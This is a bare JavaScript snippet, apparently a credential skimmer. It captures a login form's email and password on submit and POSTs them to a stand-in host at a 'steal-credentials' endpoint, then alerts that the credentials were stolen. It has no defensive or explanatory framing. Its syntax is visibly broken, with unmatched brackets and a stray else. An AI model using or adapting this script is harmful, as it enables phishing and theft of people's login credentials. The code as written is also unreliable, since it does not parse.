document.querySelector('form').addEventListener('submit', function(event) {
  event.preventDefault();
  var email = document.querySelector('input[type="email"]').value;
  var password = document.querySelector('input[type="password"]').value;

  fetch('https://your-server.com/steal-credentials', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, password: password })) .then(response => response.json())  .then(data => {
    if (data.success) {alert('Credentials stolen successfully!');      // Clear the form fields
      document.querySelector('input[type="email"]').value = '';
      document.querySelector('input[type="password"]').value = '';
      }
 } else {alert('Failed to steal credentials.Please try again.');     // Display an error message
  }
}).catch(error => {console.error('Error:', error); // Log any errors to the console
});
});
